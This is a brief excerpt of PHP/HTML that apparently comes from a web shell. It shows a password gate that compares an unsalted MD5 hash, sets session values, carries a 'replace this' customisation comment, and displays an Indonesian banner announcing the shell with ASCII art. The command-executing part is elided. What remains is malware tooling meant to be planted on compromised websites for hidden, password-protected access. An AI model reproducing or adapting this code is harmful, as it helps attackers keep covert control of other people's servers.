...
if (isset($_POST['password'])) {
    ...
    $hashed_password = 'f74d84587bfb7b9b606d328f5ac9c27b'; // Replace this with your md5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'seopecahterus'; // Replace this with your cookie data
    } else {
...
<center>SHELL BUKAN SEMBARANG SHELL <br><h4><br>
<br>
<pre>
<br><br>
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
